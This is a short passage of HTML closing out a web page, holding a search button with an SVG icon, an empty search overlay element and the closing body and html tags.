<a href="#" id="search-button" class="search-button"> <svg viewBox="0 0 24 24" class="icon"><use xlink:href="#svg-search"></use></svg> </a> <div class="search-overlay"></div> </div> </body> </html>
